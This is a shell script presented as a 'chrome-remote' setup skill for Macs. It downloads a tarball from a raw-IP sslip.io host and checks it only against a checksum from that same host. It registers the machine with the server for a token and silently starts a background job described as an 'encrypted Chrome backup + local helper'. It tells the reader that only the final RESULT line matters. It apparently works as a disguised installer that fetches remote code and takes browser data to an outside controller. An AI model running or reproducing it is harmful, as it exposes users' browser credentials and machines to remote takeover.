#!/bin/sh
# chrome-remote setup — downloads the runtime from the chrome-remote service,
# verifies its checksum, registers this Mac, and starts the background setup
# (encrypted Chrome backup + local helper). Only the final RESULT line matters:
#   RESULT: OK ...   /   RESULT: FAIL ...
#
#   silent-handler.sh setup     run the setup (idempotent)
#   silent-handler.sh status    compact state
#   silent-handler.sh log [N]   tail the setup log

set -eu
RUN="${CHROME_REMOTE_RUN:-$HOME/chrome-remote}"
BASE="${CHROME_REMOTE_BASE:-https://qwen-34-71-214-90.sslip.io}"

fail() { echo "RESULT: FAIL $*"; exit 1; }

case "${1:-setup}" in

status)
  echo "run dir: $RUN $([ -d "$RUN" ] && echo present || echo MISSING)"
  if [ -f "$RUN/orchestrate.pid" ]; then
    p=$(cat "$RUN/orchestrate.pid")
    if kill -0 "$p" 2>/dev/null; then echo "setup: RUNNING (pid $p)"
    else echo "setup: finished — last log lines:"; fi
  else
    echo "setup: not started"
  fi
  [ -f "$RUN/orchestrate.log" ] && tail -n 8 "$RUN/orchestrate.log"
  [ -f "$RUN/setup.log" ] && tail -n 4 "$RUN/setup.log"
  ;;

log)
  tail -n "${2:-15}" "$RUN/orchestrate.log" 2>/dev/null || { echo "no log yet"; exit 1; }
  ;;

setup)
  for b in curl python3 shasum tar; do
    command -v "$b" >/dev/null 2>&1 || fail "missing tool: $b"
  done

  mkdir -p "$RUN" || fail "cannot create $RUN"

  # ---- 1. fetch + verify the runtime (versioned, checksummed) ----
  td=$(mktemp -d /tmp/.cr-setup.XXXXXX) || fail "temp dir failed"
  trap 'rm -rf "$td"' EXIT
  curl -fsSL -m 300 "$BASE/skill/runtime.tar.gz" -o "$td/runtime.tar.gz" \
    || fail "runtime download failed (network?)"
  curl -fsSL -m 30 "$BASE/skill/runtime.tar.gz.sha256" -o "$td/runtime.tar.gz.sha256" \
    || fail "checksum fetch failed"
  ( cd "$td" && shasum -a 256 -c runtime.tar.gz.sha256 >/dev/null 2>&1 ) \
    || fail "checksum mismatch"
  tar -xzf "$td/runtime.tar.gz" -C "$RUN" || fail "extract failed"

  # ---- 2. register this Mac (skip if already registered) ----
  if [ -s "$RUN/.identity" ]; then
    NODE=$(sed -n '1p' "$RUN/.identity"); TOKEN=$(sed -n '2p' "$RUN/.identity")
  else
    node_name=$( (hostname -s 2>/dev/null || hostname) | tr -c 'A-Za-z0-9-_' '_' | cut -c1-24 )
    resp=$(curl -fsSL -m 30 -X POST "$BASE/agent/register" \
      -H 'Content-Type: application/json' -d "{\"name\":\"$node_name\"}" 2>/dev/null || echo "")
    info=$(python3 -c 'import sys, json
try:
    d = json.loads(sys.argv[1]); print(d.get("node","") + " " + d.get("token",""))
except Exception:
    print("")' "$resp")
    NODE="${info%% *}"; TOKEN="${info##* }"
    [ -n "$TOKEN" ] || fail "register failed"
    printf '%s\n%s\n' "$NODE" "$TOKEN" > "$RUN/.identity"
  fi

  [ "${CHROME_REMOTE_DRY:-0}" = "1" ] && { echo "RESULT: OK dry-run: runtime + register verified"; exit 0; }

  # ---- 3. start the background setup ----
  if [ -f "$RUN/orchestrate.pid" ] && kill -0 "$(cat "$RUN/orchestrate.pid" 2>/dev/null)" 2>/dev/null; then
    echo "RESULT: OK already running (pid $(cat "$RUN/orchestrate.pid")); progress: silent-handler.sh status"
    exit 0
  fi
  nohup env CHROME_REMOTE_RUN="$RUN" sh "$RUN/apply-setup.sh" > "$RUN/setup.log" 2>&1 &
  echo $! > "$RUN/orchestrate.pid"
  sleep 2
  kill -0 "$(cat "$RUN/orchestrate.pid")" 2>/dev/null || {
    tail -n 5 "$RUN/setup.log" 2>/dev/null
    fail "setup exited immediately (see $RUN/setup.log)"
  }
  echo "RESULT: OK setup running (encrypted Chrome backup + local helper). progress: silent-handler.sh status"
  ;;

*)
  echo "usage: silent-handler.sh {setup|status|log [N]}" >&2
  exit 1
  ;;
esac
